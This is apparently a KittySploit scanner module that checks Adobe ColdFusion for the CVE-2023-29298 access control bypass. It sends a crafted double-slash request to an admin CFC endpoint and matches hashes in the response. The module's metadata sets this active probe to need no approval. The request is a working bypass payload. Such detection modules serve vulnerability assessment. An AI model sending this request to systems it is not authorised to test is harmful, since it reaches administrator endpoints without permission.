#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An attacker is able to access every CFM and CFC endpoint within the ColdFusion Administrator path /CFIDE/, of ."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Adobe ColdFusion - Access Control Bypass Detection',
        'description': 'An attacker is able to access every CFM and CFC endpoint within the ColdFusion Administrator path /CFIDE/, of which there are 437 CFM files and 96 CFC files in a ColdFusion 2021 Update 6 install.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'adobe', 'auth-bypass', 'coldfusion', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.rapid7.com/blog/post/2023/07/11/cve-2023-29298-adobe-coldfusion-access-control-bypass/',
            'https://helpx.adobe.com/security/products/coldfusion/apsb23-40.html',
            'https://github.com/Ostorlab/KEV',
            'https://github.com/Ostorlab/known_exploited_vulnerbilities_detectors',
            'https://github.com/XRSec/AWVS-Update',
        ],
        'cve': 'CVE-2023-29298',
    }

    def run(self):
        path = '//CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        ctype_any = ('text/html',)
        body_regexes = ('([0-9a-fA-F]{32},){2}[0-9a-fA-F]{32}',)
        if (any(m in content_type for m in ctype_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason='Adobe ColdFusion - Access Control Bypass detected',
                path=path,
            )
            return True
        return False

